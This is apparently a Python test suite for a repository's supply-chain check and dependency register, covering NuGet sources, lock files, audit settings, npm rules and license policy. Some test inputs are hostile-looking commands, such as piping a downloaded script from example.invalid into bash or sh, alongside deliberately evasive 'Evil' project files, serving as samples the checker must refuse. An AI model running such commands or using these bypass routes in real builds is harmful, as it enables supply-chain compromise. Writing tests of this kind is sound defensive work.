"""Tests for the supply-chain check and the dependency register (SEC-02).

    python3 .github/scripts/tests/test_supply_chain.py

Each test builds a small repository in a temporary folder and shows one rule
holding or one violation being refused.
"""

import contextlib
import importlib.util
import io
import json
import os
import pathlib
import subprocess
import sys
import tempfile
import unittest

sys.dont_write_bytecode = True  # keep the scripts folder free of __pycache__

SCRIPTS = pathlib.Path(__file__).resolve().parent.parent


def load(name):
    spec = importlib.util.spec_from_file_location(name.replace("-", "_"), SCRIPTS / f"{name}.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


supply_chain = load("check-supply-chain")
register = load("dependency-register")

NUGET_CONFIG = """<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <packageSources>
    <clear />
    <add key="nuget.org" value="https://api.nuget.org/v3/index.json" protocolVersion="3" />
  </packageSources>
  <packageSourceMapping>
    <packageSource key="nuget.org">
      <package pattern="*" />
    </packageSource>
  </packageSourceMapping>
</configuration>
"""
PACKAGES_PROPS = """<Project>
  <PropertyGroup><ManagePackageVersionsCentrally>true</ManagePackageVersionsCentrally></PropertyGroup>
  <ItemGroup><PackageVersion Include="Example.Package" Version="1.2.3" /></ItemGroup>
</Project>
"""
BUILD_PROPS = """<Project>
  <PropertyGroup>
    <TreatWarningsAsErrors>true</TreatWarningsAsErrors>
    <RestorePackagesWithLockFile>true</RestorePackagesWithLockFile>
    <RestoreLockedMode Condition="'$(CI)' == 'true'">true</RestoreLockedMode>
    <NuGetAudit>true</NuGetAudit>
    <NuGetAuditMode>all</NuGetAuditMode>
    <NuGetAuditLevel>low</NuGetAuditLevel>
  </PropertyGroup>
</Project>
"""
PROJECT = """<Project Sdk="Microsoft.NET.Sdk">
  <ItemGroup><PackageReference Include="Example.Package" /></ItemGroup>
</Project>
"""
LOCK = {"version": 1, "dependencies": {"net10.0": {
    "Example.Package": {"type": "Direct", "requested": "[1.2.3, )", "resolved": "1.2.3", "contentHash": "abc=="},
    "Example.Dependency": {"type": "Transitive", "resolved": "4.5.6", "contentHash": "def=="}}}}
WORKFLOW = """name: ci
on: [pull_request]
jobs:
  build:
    runs-on: ubuntu-24.04
    steps:
      - run: dotnet restore --locked-mode
"""


class Repository:
    """A minimal repository that keeps every supply-chain rule, committed to git."""

    def __init__(self, folder):
        self.root = pathlib.Path(folder)
        self.write("NuGet.Config", NUGET_CONFIG)
        self.write("Directory.Packages.props", PACKAGES_PROPS)
        self.write("Directory.Build.props", BUILD_PROPS)
        self.write(".npmrc", "registry=https://registry.npmjs.org/\nignore-scripts=true\n")
        self.write("tests/Example.Tests/Example.Tests.csproj", PROJECT)
        self.write("tests/Example.Tests/packages.lock.json", json.dumps(LOCK))
        self.write(".github/workflows/ci.yml", WORKFLOW)
        self.git("init", "-q")
        self.commit()

    def write(self, path, text):
        target = self.root / path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(text, encoding="utf-8")

    def git(self, *args):
        subprocess.run(["git", "-C", str(self.root), "-c", "user.name=test", "-c", "user.email=test@example.invalid",
                        "-c", "commit.gpgsign=false", *args], check=True, capture_output=True)

    def commit(self):
        self.git("add", "-A")
        self.git("commit", "-q", "-m", "state", "--allow-empty")

    def problems(self):
        return supply_chain.check(self.root)


class SupplyChainCheck(unittest.TestCase):
    def setUp(self):
        self.folder = tempfile.TemporaryDirectory()
        self.repo = Repository(self.folder.name)

    def tearDown(self):
        self.folder.cleanup()

    def assertRefused(self, fragment):
        problems = self.repo.problems()
        self.assertTrue(any(fragment in p for p in problems), f"expected a problem mentioning {fragment!r}, got {problems}")

    def test_a_compliant_repository_passes(self):
        self.assertEqual(self.repo.problems(), [])

    # The Reviewer's re-review 01M5WSE36DR0H4QBG710PJJF0G found these routes in revision 2.

    def test_an_msbuild_project_with_an_unknown_extension_is_checked(self):
        evil = """<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup><ManagePackageVersionsCentrally>false</ManagePackageVersionsCentrally>
    <NuGetLockFilePath>obj/hidden.lock.json</NuGetLockFilePath></PropertyGroup>
  <ItemGroup><PackageReference Include="Example.Package" Version="*" /></ItemGroup>
</Project>
"""
        for name in ("src/Evil/Evil.msbuildproj", "src/Native/Native.vcxproj", "src/Plain/build.xml"):
            with self.subTest(name=name):
                self.repo.write(name, evil)
                problems = self.repo.problems()
                for fragment in ("sets ManagePackageVersionsCentrally", "sets NuGetLockFilePath", "sets Version", "has no packages.lock.json"):
                    self.assertTrue(any(name in p and fragment in p for p in problems), f"{name}: {fragment} not in {problems}")
                (self.repo.root / name).unlink()

    def test_restore_sources_in_any_project_file_are_refused(self):
        self.repo.write("src/Native/Native.vcxproj", """<?xml version="1.0" encoding="utf-8"?>
<!-- a native project -->
<Project><PropertyGroup><RestoreSources>https://example.invalid/feed</RestoreSources></PropertyGroup></Project>
""")
        self.assertRefused("src/Native/Native.vcxproj: sets RestoreSources")

    def test_xml_that_is_not_msbuild_is_left_alone(self):
        self.repo.write("docs/layout.xml", "<?xml version=\"1.0\"?>\n<Layout><Project>name</Project></Layout>\n")
        self.assertEqual(self.repo.problems(), [])

    def test_the_audit_cannot_be_turned_off_or_silenced_below_the_root(self):
        cases = {
            "<PropertyGroup><NuGetAudit>false</NuGetAudit></PropertyGroup>": "sets NuGetAudit",
            "<PropertyGroup><NuGetAuditMode>direct</NuGetAuditMode></PropertyGroup>": "sets NuGetAuditMode",
            "<PropertyGroup><NuGetAuditLevel>critical</NuGetAuditLevel></PropertyGroup>": "sets NuGetAuditLevel",
            "<PropertyGroup><TreatWarningsAsErrors>false</TreatWarningsAsErrors></PropertyGroup>": "sets TreatWarningsAsErrors",
            "<PropertyGroup><NoWarn>$(NoWarn);NU1903</NoWarn></PropertyGroup>": "names a NuGet audit warning",
            "<PropertyGroup><WarningsNotAsErrors>nu1901</WarningsNotAsErrors></PropertyGroup>": "names a NuGet audit warning",
            '<ItemGroup><NuGetAuditSuppress Include="https://github.com/advisories/GHSA-0000-0000-0000" /></ItemGroup>': "suppressions belong in the root",
        }
        for body, fragment in cases.items():
            for path in ("src/Directory.Build.props", "tests/Example.Tests/Example.Tests.csproj"):
                with self.subTest(body=body, path=path):
                    original = (self.repo.root / path).read_text() if (self.repo.root / path).is_file() else None
                    self.repo.write(path, f'<Project Sdk="Microsoft.NET.Sdk">{body}</Project>' if path.endswith("proj") else f"<Project>{body}</Project>")
                    self.assertRefused(fragment)
                    if original is None:
                        (self.repo.root / path).unlink()
                    else:
                        self.repo.write(path, original)

    def test_the_root_audit_settings_are_required_and_unconditional(self):
        self.repo.write("Directory.Build.props", BUILD_PROPS.replace("<NuGetAuditLevel>low</NuGetAuditLevel>", "<NuGetAuditLevel>high</NuGetAuditLevel>"))
        self.assertRefused("must set NuGetAuditLevel to low")
        self.repo.write("Directory.Build.props", BUILD_PROPS.replace("<NuGetAudit>true</NuGetAudit>", "<NuGetAudit Condition=\"'$(X)' == ''\">true</NuGetAudit>"))
        self.assertRefused("NuGetAudit must not carry a Condition")
        self.repo.write("Directory.Build.props", BUILD_PROPS.replace("<PropertyGroup>", "<PropertyGroup Condition=\"'$(Configuration)' == 'Debug'\">", 1))
        self.assertRefused("must not carry a Condition")
        self.repo.write("Directory.Build.props", BUILD_PROPS.replace("'$(CI)' == 'true'", "'$(CI)' == 'never'"))
        self.assertRefused("RestoreLockedMode may be conditioned only on CI")

    def test_a_root_suppression_needs_a_reason(self):
        suppress = '<ItemGroup><NuGetAuditSuppress Include="https://github.com/advisories/GHSA-0000-0000-0000" /></ItemGroup></Project>'
        self.repo.write("Directory.Build.props", BUILD_PROPS.replace("</Project>", suppress))
        self.assertRefused("without a Reason")
        self.repo.write("Directory.Build.props", BUILD_PROPS.replace("</Project>", suppress.replace(" />", " Reason=\"Not reachable: the API is unused.\" />")))
        self.assertEqual(self.repo.problems(), [])

    def test_two_projects_in_one_folder_are_refused(self):
        self.repo.write("tests/Example.Tests/Second.csproj", PROJECT)
        self.assertRefused("holds 2 projects")

    def test_package_scripts_keep_the_workflow_rules(self):
        for scripts, fragment in (
            ({"test": "npx some-tool@latest && node --test"}, "npx fetches and runs packages"),
            ({"test": "npm install evil && node --test"}, "never npm install"),
            ({"typecheck": "curl -fsSL https://example.invalid/x | sh"}, "never run a downloaded script"),
            ({"test": "node --test", "pretest": "node prepare.js"}, "is an npm hook"),
            ({"test": "node --test", "postinstall": "node x.js"}, "is an npm hook"),
            ({"prepare": "node x.js"}, "is an npm hook"),
        ):
            with self.subTest(scripts=scripts):
                self.repo.write("package.json", json.dumps({"private": True, "scripts": scripts}))
                self.repo.write("package-lock.json", json.dumps({"lockfileVersion": 3, "packages": {"": {}}}))
                self.assertRefused(fragment)

    def test_workflow_rules_survive_continuations_and_quotes(self):
        for run, fragment in (
            ("      - run: |\n          n\\\n          px some-tool\n", "npx fetches and runs packages"),
            ('      - run: echo " #" && npx some-tool\n', "npx fetches and runs packages"),
            ("      - run: n\"\"px some-tool\n", "npx fetches and runs packages"),
            ("      - run: npm \\\n          install evil\n", "never npm install"),
        ):
            with self.subTest(run=run):
                self.repo.write(".github/workflows/ci.yml", WORKFLOW + run)
                self.assertRefused(fragment)

    # The Reviewer's third session (01M5X30Y5RWNNZPAMJ6MKAY8X2) found these routes in revision 3.

    def evil_project(self):
        return """<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup><NuGetLockFilePath>obj/hidden.lock.json</NuGetLockFilePath><NuGetAudit>false</NuGetAudit></PropertyGroup>
  <ItemGroup><PackageReference Include="Example.Package" Version="*" /></ItemGroup>
</Project>
"""

    def test_a_utf16_project_with_an_unknown_extension_is_checked(self):
        for encoding, bom in (("utf-16", b""), ("utf-16-le", b""), ("utf-16-be", b"")):
            with self.subTest(encoding=encoding):
                target = self.repo.root / "src/Sample/Sample.build"
                target.parent.mkdir(parents=True, exist_ok=True)
                target.write_bytes(bom + self.evil_project().encode(encoding))
                self.assertRefused("src/Sample/Sample.build: sets NuGetLockFilePath")
                target.unlink()

    def test_a_project_behind_a_long_preamble_is_checked(self):
        preamble = "<?xml version=\"1.0\"?>\n" + "<!-- " + "x" * 7000 + " -->\n<?note a processing instruction?>\n"
        self.repo.write("src/Sample/Sample.build", preamble + self.evil_project())
        self.assertRefused("src/Sample/Sample.build: sets NuGetAudit")

    def test_every_project_a_solution_lists_is_checked(self):
        self.repo.write("Example.slnx", '<Solution>\n  <Project Path="src/Odd/Odd.thing" Type="C#" />\n</Solution>\n')
        self.repo.write("src/Odd/Odd.thing", self.evil_project())
        self.assertRefused("src/Odd/Odd.thing: has no packages.lock.json")

    def test_audit_codes_are_found_after_character_references_are_decoded(self):
        for value in ("$(NoWarn);NU&#49;903", "NU&#x31;901", "nu1999"):
            with self.subTest(value=value):
                self.repo.write("tests/Example.Tests/Example.Tests.csproj", PROJECT.replace(
                    "<ItemGroup>", f"<PropertyGroup><NoWarn>{value}</NoWarn></PropertyGroup><ItemGroup>"))
                self.assertRefused("names a NuGet audit warning")

    def test_warning_lists_name_literal_codes_only(self):
        for body in ("<PropertyGroup><A>NU19</A><B>03</B><NoWarn>$(NoWarn);$(A)$(B)</NoWarn></PropertyGroup>",
                     "<PropertyGroup><MSBuildWarningsAsMessages>$(Codes)</MSBuildWarningsAsMessages></PropertyGroup>",
                     '<ItemGroup><PackageReference Update="Example.Package" NoWarn="$(Hidden)" /></ItemGroup>',
                     "<PropertyGroup><WarningsNotAsErrors>$([System.String]::Concat('NU19','03'))</WarningsNotAsErrors></PropertyGroup>"):
            with self.subTest(body=body):
                self.repo.write("tests/Example.Tests/Example.Tests.csproj", PROJECT.replace("<ItemGroup>", body + "<ItemGroup>", 1))
                self.assertRefused("warning lists name literal codes only")
        self.repo.write("tests/Example.Tests/Example.Tests.csproj",
                        PROJECT.replace("<ItemGroup>", "<PropertyGroup><NoWarn>$(NoWarn);CA1822;IDE0005</NoWarn></PropertyGroup><ItemGroup>", 1))
        self.assertEqual(self.repo.problems(), [])

    def test_inline_comments_outside_quotes_are_not_commands(self):
        self.repo.write(".github/workflows/ci.yml", WORKFLOW + "      - run: node build.js # moving away from npx\n")
        self.assertEqual(self.repo.problems(), [])
        self.repo.write(".github/workflows/ci.yml", WORKFLOW + '      - run: echo "a # b" && npx some-tool\n')
        self.assertRefused("npx fetches and runs packages")

    def test_a_project_without_a_lock_file_is_refused(self):
        (self.repo.root / "tests/Example.Tests/packages.lock.json").unlink()
        self.assertRefused("has no packages.lock.json")

    def test_an_uncommitted_lock_file_is_refused(self):
        self.repo.write("src/Example/Example.csproj", PROJECT)
        self.repo.git("add", "src/Example/Example.csproj")
        self.repo.git("commit", "-q", "-m", "project only")
        self.repo.write("src/Example/packages.lock.json", json.dumps(LOCK))
        self.assertRefused("src/Example/packages.lock.json: exists but is not committed")

    def test_a_version_on_a_package_reference_is_refused(self):
        self.repo.write("tests/Example.Tests/Example.Tests.csproj",
                        PROJECT.replace('Include="Example.Package"', 'Include="Example.Package" Version="1.2.3"'))
        self.assertRefused("sets Version")

    def test_a_version_override_is_refused(self):
        self.repo.write("tests/Example.Tests/Example.Tests.csproj",
                        PROJECT.replace('Include="Example.Package"', 'Include="Example.Package" VersionOverride="1.2.4"'))
        self.assertRefused("sets VersionOverride")

    def test_a_floating_central_version_is_refused(self):
        self.repo.write("Directory.Packages.props", PACKAGES_PROPS.replace('Version="1.2.3"', 'Version="1.*"'))
        self.assertRefused("must have an exact version")

    def test_lock_files_turned_off_are_refused(self):
        self.repo.write("Directory.Build.props", BUILD_PROPS.replace(">true<", ">false<"))
        self.assertRefused("RestorePackagesWithLockFile")

    def test_a_second_package_source_is_refused(self):
        self.repo.write("NuGet.Config", NUGET_CONFIG.replace(
            '<add key="nuget.org"', '<add key="other" value="https://example.invalid/v3/index.json" />\n    <add key="nuget.org"'))
        self.assertRefused("the only package source must be")

    def test_inherited_sources_are_refused(self):
        self.repo.write("NuGet.Config", NUGET_CONFIG.replace("    <clear />\n", ""))
        self.assertRefused("must start with <clear />")

    def test_unmapped_packages_are_refused(self):
        self.repo.write("NuGet.Config", NUGET_CONFIG.replace('pattern="*"', 'pattern="Example.*"'))
        self.assertRefused("packageSourceMapping")

    def test_a_restore_source_property_is_refused(self):
        self.repo.write("tests/Example.Tests/Example.Tests.csproj", PROJECT.replace(
            "<ItemGroup>", "<PropertyGroup><RestoreSources>https://example.invalid/v3/index.json</RestoreSources></PropertyGroup>\n  <ItemGroup>"))
        self.assertRefused("sets RestoreSources")

    def test_an_additional_source_in_a_props_file_is_refused(self):
        self.repo.write("Directory.Build.props", BUILD_PROPS.replace(
            "</PropertyGroup>", "<RestoreAdditionalProjectSources>https://example.invalid/v3/index.json</RestoreAdditionalProjectSources></PropertyGroup>"))
        self.assertRefused("sets RestoreAdditionalProjectSources")

    def test_a_package_reference_in_a_targets_file_is_refused(self):
        self.repo.write("Directory.Build.targets",
                        '<Project><ItemGroup><PackageReference Include="Example.Package" Version="9.9.9" /></ItemGroup></Project>')
        self.assertRefused("declares PackageReference Example.Package")

    def test_a_source_on_the_command_line_in_a_workflow_is_refused(self):
        self.repo.write(".github/workflows/ci.yml", WORKFLOW + "      - run: dotnet restore --locked-mode --source https://example.invalid/v3/index.json\n")
        self.assertRefused("never from the command line")

    def test_adding_a_source_in_a_workflow_is_refused(self):
        self.repo.write(".github/workflows/ci.yml", WORKFLOW + "      - run: dotnet nuget add source https://example.invalid/v3/index.json\n")
        self.assertRefused("workflows never add package sources")

    def test_an_ignored_looking_folder_that_git_does_not_ignore_is_still_checked(self):
        self.repo.write("artifacts/Evil/Evil.csproj", PROJECT.replace('Include="Example.Package"', 'Include="Example.Package" Version="1.0.0"'))
        self.repo.write("artifacts/Evil/nuget.config", NUGET_CONFIG)
        problems = self.repo.problems()
        self.assertTrue(any("artifacts/Evil/Evil.csproj: has no packages.lock.json" in p for p in problems), problems)
        self.assertTrue(any("artifacts/Evil/nuget.config" in p for p in problems), problems)

    def test_a_git_ignored_build_folder_is_not_checked(self):
        self.repo.write(".gitignore", "obj/\n")
        self.repo.write("tests/Example.Tests/obj/project.assets.json", "{}")
        self.repo.write("tests/Example.Tests/obj/Generated.props", "<Project><PropertyGroup><RestoreSources>x</RestoreSources></PropertyGroup></Project>")
        self.assertEqual(self.repo.problems(), [])

    def test_moving_the_lock_file_is_refused(self):
        self.repo.write("tests/Example.Tests/Example.Tests.csproj", PROJECT.replace(
            "<ItemGroup>", "<PropertyGroup><NuGetLockFilePath>obj/other.lock.json</NuGetLockFilePath></PropertyGroup>\n  <ItemGroup>"))
        self.assertRefused("sets NuGetLockFilePath")

    def test_turning_lock_files_off_in_a_targets_file_is_refused(self):
        self.repo.write("Directory.Build.targets", "<Project><PropertyGroup><RestorePackagesWithLockFile>false</RestorePackagesWithLockFile><RestoreLockedMode>false</RestoreLockedMode></PropertyGroup></Project>")
        self.assertRefused("Directory.Build.targets: sets RestorePackagesWithLockFile")
        self.assertRefused("Directory.Build.targets: sets RestoreLockedMode")

    def test_turning_central_versions_off_in_a_project_is_refused(self):
        self.repo.write("tests/Example.Tests/Example.Tests.csproj", PROJECT.replace(
            "<ItemGroup>", "<PropertyGroup><ManagePackageVersionsCentrally>false</ManagePackageVersionsCentrally></PropertyGroup>\n  <ItemGroup>"))
        self.assertRefused("sets ManagePackageVersionsCentrally")

    def test_a_response_file_is_refused(self):
        self.repo.write("Directory.Build.rsp", "-p:RestoreSources=https://example.invalid/v3/index.json")
        self.assertRefused("Directory.Build.rsp: response files")

    def test_an_import_is_refused(self):
        self.repo.write("tests/Example.Tests/Example.Tests.csproj", PROJECT.replace("<ItemGroup>", '<Import Project="shared.xml" />\n  <ItemGroup>'))
        self.assertRefused("has an Import element")

    def test_a_feed_sdk_is_refused(self):
        self.repo.write("tests/Example.Tests/Example.Tests.csproj", PROJECT.replace('Sdk="Microsoft.NET.Sdk"', 'Sdk="Evil.Sdk/1.0.0"'))
        self.assertRefused("names SDK 'Evil.Sdk/1.0.0'")
        self.repo.write("tests/Example.Tests/Example.Tests.csproj", PROJECT.replace("<ItemGroup>", '<Sdk Name="Evil.Sdk" Version="1.0.0" />\n  <ItemGroup>'))
        self.assertRefused("has an Sdk element")

    def test_msbuild_sdks_in_global_json_are_refused(self):
        self.repo.write("global.json", '{"sdk": {"version": "10.0.100"}, "msbuild-sdks": {"Evil.Sdk": "1.0.0"}}')
        self.assertRefused("global.json: msbuild-sdks")

    def test_a_nested_central_version_file_is_refused(self):
        self.repo.write("src/Directory.Packages.props", PACKAGES_PROPS.replace('Version="1.2.3"', 'Version="1.*"'))
        self.assertRefused("src/Directory.Packages.props: only the root Directory.Packages.props")

    def test_a_package_version_in_a_project_is_refused(self):
        self.repo.write("tests/Example.Tests/Example.Tests.csproj", PROJECT.replace("</ItemGroup>", '<PackageVersion Include="Other" Version="2.0.0" /></ItemGroup>'))
        self.assertRefused("declares PackageVersion Other")

    def test_an_unpinned_npm_registry_is_refused(self):
        self.repo.write(".npmrc", "ignore-scripts=true\n")
        self.assertRefused(".npmrc must set registry=https://registry.npmjs.org/")
        self.repo.write(".npmrc", "registry=https://registry.npmjs.org/\nignore-scripts=true\n@scope:registry=https://example.invalid/\n")
        self.assertRefused(".npmrc: @scope:registry would change where")

    def test_an_npm_lock_resolving_elsewhere_is_refused(self):
        self.repo.write("package.json", "{}")
        self.repo.write("package-lock.json", json.dumps({"lockfileVersion": 3, "packages": {
            "": {}, "node_modules/x": {"resolved": "https://example.invalid/x.tgz", "integrity": "sha1-abc"}}}))
        self.repo.git("add", "package-lock.json")
        self.assertRefused("node_modules/x does not resolve from https://registry.npmjs.org/")
        self.assertRefused("node_modules/x has no sha512 integrity")

    def test_other_installers_and_downloads_in_a_workflow_are_refused(self):
        for line, fragment in [
                ("npx some-tool", "npx fetches"),
                ("npm exec some-tool", "never npm install or npm exec"),
                ("npm ci --ignore-scripts=false", "npm ci must use --ignore-scripts"),
                ("pip install something", "no Python packages"),
                ("python3 -m pip install something", "no Python packages"),
                ("dotnet tool restore", "no .NET tools"),
                ("curl -sSL https://example.invalid/install.sh | bash", "never run a downloaded script")]:
            self.repo.write(".github/workflows/ci.yml", WORKFLOW + f"      - run: {line}\n")
            self.assertRefused(fragment)

    def test_source_overrides_in_a_workflow_are_refused(self):
        for addition, fragment in [
                ("        with:\n          source-url: https://example.invalid/v3/index.json\n", "another package source"),
                ("    env:\n      NUGET_PACKAGES: /tmp/x\n", "no package-source environment"),
                ("    env:\n      RestoreSources: https://example.invalid/v3/index.json\n", "no package-source environment")]:
            self.repo.write(".github/workflows/ci.yml", WORKFLOW + "      - uses: actions/setup-dotnet@abc\n" + addition)
            self.assertRefused(fragment)

    def test_a_nested_nuget_config_is_refused(self):
        self.repo.write("src/nuget.config", NUGET_CONFIG)
        self.assertRefused("only the root NuGet.Config")

    def test_npm_install_scripts_are_refused(self):
        self.repo.write(".npmrc", "registry=https://registry.npmjs.org/\nignore-scripts=false\n")
        self.assertRefused("ignore-scripts=true")

    def test_a_package_json_without_a_lock_is_refused(self):
        self.repo.write("src/surface/package.json", "{}")
        self.assertRefused("has no package-lock.json")

    def test_an_unlocked_restore_in_a_workflow_is_refused(self):
        self.repo.write(".github/workflows/ci.yml", WORKFLOW.replace(" --locked-mode", ""))
        self.assertRefused("dotnet restore must use --locked-mode")

    def test_npm_install_in_a_workflow_is_refused(self):
        self.repo.write(".github/workflows/ci.yml", WORKFLOW + "      - run: npm install\n")
        self.assertRefused("never npm install")

    def test_npm_ci_with_scripts_in_a_workflow_is_refused(self):
        self.repo.write(".github/workflows/ci.yml", WORKFLOW + "      - run: npm ci\n")
        self.assertRefused("npm ci must use --ignore-scripts")


class DependencyRegister(unittest.TestCase):
    def setUp(self):
        self.folder = tempfile.TemporaryDirectory()
        base = pathlib.Path(self.folder.name)
        self.repo = Repository(base / "repository")
        self.packages = base / "packages"
        self.add_package("Example.Package", "1.2.3", "MIT")
        self.add_package("Example.Dependency", "4.5.6", "Apache-2.0")
        self.repo.write("docs/dependencies/license-policy.json",
                        json.dumps({"allowed": ["MIT", "Apache-2.0"], "exceptions": []}))
        self.environment = mock_environment(NUGET_PACKAGES=str(self.packages))
        self.environment.__enter__()

    def tearDown(self):
        self.environment.__exit__(None, None, None)
        self.folder.cleanup()

    def add_package(self, name, version, license, source=register.NUGET_ORG):
        folder = self.packages / name.lower() / version
        folder.mkdir(parents=True, exist_ok=True)
        (folder / f"{name.lower()}.nuspec").write_text(
            f'<package><metadata><id>{name}</id><license type="expression">{license}</license></metadata></package>',
            encoding="utf-8")
        (folder / ".nupkg.metadata").write_text(json.dumps({"version": 2, "source": source}), encoding="utf-8")

    def run_script(self, command):
        with contextlib.redirect_stdout(io.StringIO()) as output:
            code = register.main(["dependency-register.py", command, str(self.repo.root)])
        return code, output.getvalue()

    def test_a_written_register_checks_clean(self):
        self.assertEqual(self.run_script("write")[0], 0)
        code, output = self.run_script("check")
        self.assertEqual(code, 0, output)
        written = json.loads((self.repo.root / "docs/dependencies/register.json").read_text())
        self.assertEqual([p["id"] for p in written["packages"]], ["Example.Dependency", "Example.Package"])
        self.assertEqual({p["ecosystem"] for p in written["packages"]}, {"nuget"})
        self.assertEqual(written["packages"][1]["projects"], [{"path": "tests/Example.Tests", "dependency": "direct"}])
        self.assertEqual(written["packages"][1]["uses"], ["test"])

    def test_a_changed_lock_file_makes_the_register_out_of_date(self):
        self.run_script("write")
        changed = json.loads(json.dumps(LOCK))
        changed["dependencies"]["net10.0"]["Example.Dependency"]["resolved"] = "4.5.7"
        self.add_package("Example.Dependency", "4.5.7", "Apache-2.0")
        self.repo.write("tests/Example.Tests/packages.lock.json", json.dumps(changed))
        code, output = self.run_script("check")
        self.assertEqual(code, 1)
        self.assertIn("added: Example.Dependency 4.5.7", output)
        self.assertIn("removed: Example.Dependency 4.5.6", output)

    def test_a_disallowed_license_is_refused(self):
        self.add_package("Example.Dependency", "4.5.6", "GPL-3.0-only")
        code, output = self.run_script("write")
        self.assertEqual(code, 1)
        self.assertIn("is not allowed for test use", output)

    def test_a_recorded_exception_allows_a_license(self):
        self.add_package("Example.Dependency", "4.5.6", "MPL-2.0")
        self.repo.write("docs/dependencies/license-policy.json", json.dumps({"allowed": ["MIT", "Apache-2.0"], "exceptions": [
            {"id": "Example.Dependency", "version": "4.5.6", "use": "test", "reason": "test only", "decision": "D0"}]}))
        self.assertEqual(self.run_script("write")[0], 0)

    def test_an_experiment_only_license_is_recorded_not_restricted(self):
        self.add_package("Example.Package", "1.2.3", "MIT")
        self.add_package("Example.Dependency", "4.5.6", "LicenseRef-Proprietary")
        self.repo.write("docs/dependencies/license-policy.json", json.dumps(
            {"allowed": ["MIT"], "unrestrictedUses": ["experiment"], "exceptions": []}))
        experiment = json.loads(json.dumps(LOCK))
        del experiment["dependencies"]["net10.0"]["Example.Package"]
        experiment["dependencies"]["net10.0"]["Example.Dependency"]["type"] = "Direct"
        self.repo.write("experiments/Spike/Spike.csproj", PROJECT)
        self.repo.write("experiments/Spike/packages.lock.json", json.dumps(experiment))
        self.repo.write("tests/Example.Tests/packages.lock.json", json.dumps(
            {"version": 1, "dependencies": {"net10.0": {"Example.Package": LOCK["dependencies"]["net10.0"]["Example.Package"]}}}))
        code, output = self.run_script("write")
        self.assertEqual(code, 0, output)
        written = json.loads((self.repo.root / "docs/dependencies/register.json").read_text())
        dependency = next(p for p in written["packages"] if p["id"] == "Example.Dependency")
        self.assertEqual(dependency["license"], "LicenseRef-Proprietary")
        self.assertEqual(dependency["uses"], ["experiment"])

    def test_an_unrestricted_use_does_not_excuse_a_test_use(self):
        self.add_package("Example.Dependency", "4.5.6", "LicenseRef-Proprietary")
        self.repo.write("docs/dependencies/license-policy.json", json.dumps(
            {"allowed": ["MIT", "Apache-2.0"], "unrestrictedUses": ["experiment"], "exceptions": []}))
        code, output = self.run_script("write")
        self.assertEqual(code, 1)
        self.assertIn("is not allowed for test use", output)

    def npm_lock(self, **overrides):
        entry = {"version": "5.0.0", "resolved": "https://registry.npmjs.org/example-tool/-/example-tool-5.0.0.tgz",
                 "integrity": "sha512-abc", "dev": True, "license": "MIT"}
        entry.update(overrides)
        return {"lockfileVersion": 3, "packages": {
            "": {"name": "example", "devDependencies": {"example-tool": "5.0.0"}},
            "node_modules/example-tool": entry}}

    def test_npm_packages_are_registered_from_the_lock(self):
        self.repo.write("package-lock.json", json.dumps(self.npm_lock()))
        self.assertEqual(self.run_script("write")[0], 0)
        written = json.loads((self.repo.root / "docs/dependencies/register.json").read_text())
        npm = [p for p in written["packages"] if p["ecosystem"] == "npm"]
        self.assertEqual(npm, [{"ecosystem": "npm", "id": "example-tool", "version": "5.0.0", "source": "https://registry.npmjs.org/",
                                "contentHash": "sha512-abc", "license": "MIT", "uses": ["development"],
                                "projects": [{"path": ".", "dependency": "direct"}]}])

    def test_an_npm_package_from_another_source_is_refused(self):
        self.repo.write("package-lock.json", json.dumps(self.npm_lock(resolved="https://example.invalid/example-tool-5.0.0.tgz")))
        code, output = self.run_script("write")
        self.assertEqual(code, 1)
        self.assertIn("not https://registry.npmjs.org/", output)

    def test_an_npm_package_without_integrity_is_refused(self):
        self.repo.write("package-lock.json", json.dumps(self.npm_lock(integrity="sha1-abc")))
        code, output = self.run_script("write")
        self.assertEqual(code, 1)
        self.assertIn("no sha512 integrity", output)

    def test_an_npm_package_with_a_disallowed_license_is_refused(self):
        self.repo.write("package-lock.json", json.dumps(self.npm_lock(license="GPL-3.0-only")))
        code, output = self.run_script("write")
        self.assertEqual(code, 1)
        self.assertIn("is not allowed for development use", output)

    def test_an_or_expression_needs_one_allowed_alternative(self):
        self.assertTrue(register.license_allowed("GPL-2.0-only OR MIT", {"MIT"}))
        self.assertFalse(register.license_allowed("MIT AND GPL-2.0-only", {"MIT"}))
        self.assertFalse(register.license_allowed({"url": "https://example.invalid/license"}, {"MIT"}))

    def test_license_expressions_respect_precedence_and_parentheses(self):
        allowed = {"MIT", "Apache-2.0"}
        self.assertFalse(register.license_allowed("GPL-3.0-only AND (MIT OR Apache-2.0)", allowed))
        self.assertTrue(register.license_allowed("(GPL-3.0-only AND MIT) OR Apache-2.0", allowed))
        self.assertTrue(register.license_allowed("MIT OR GPL-3.0-only AND Apache-2.0", allowed))
        self.assertFalse(register.license_allowed("GPL-3.0-only AND MIT OR GPL-3.0-only AND Apache-2.0", allowed))
        self.assertTrue(register.license_allowed("(MIT)", allowed))

    def test_license_exceptions_and_malformed_expressions(self):
        self.assertFalse(register.license_allowed("GPL-2.0-only WITH Classpath-exception-2.0", {"GPL-2.0-only"}))
        self.assertTrue(register.license_allowed("GPL-2.0-only WITH Classpath-exception-2.0", {"GPL-2.0-only WITH Classpath-exception-2.0"}))
        for malformed in ["", "MIT AND", "(MIT", "MIT)", "AND MIT", "MIT OR OR Apache-2.0", "MIT WITH"]:
            self.assertFalse(register.license_allowed(malformed, {"MIT", "Apache-2.0"}), malformed)

    def test_a_package_from_another_source_is_refused(self):
        self.add_package("Example.Dependency", "4.5.6", "Apache-2.0", source="https://example.invalid/v3/index.json")
        code, output = self.run_script("write")
        self.assertEqual(code, 1)
        self.assertIn("not https://api.nuget.org/v3/index.json", output)

    def test_a_package_that_was_not_restored_is_refused(self):
        (self.packages / "example.dependency" / "4.5.6" / "example.dependency.nuspec").unlink()
        code, output = self.run_script("write")
        self.assertEqual(code, 1)
        self.assertIn("run a locked restore first", output)


@contextlib.contextmanager
def mock_environment(**values):
    saved = {k: os.environ.get(k) for k in values}
    os.environ.update(values)
    try:
        yield
    finally:
        for key, value in saved.items():
            if value is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = value


if __name__ == "__main__":
    unittest.main()
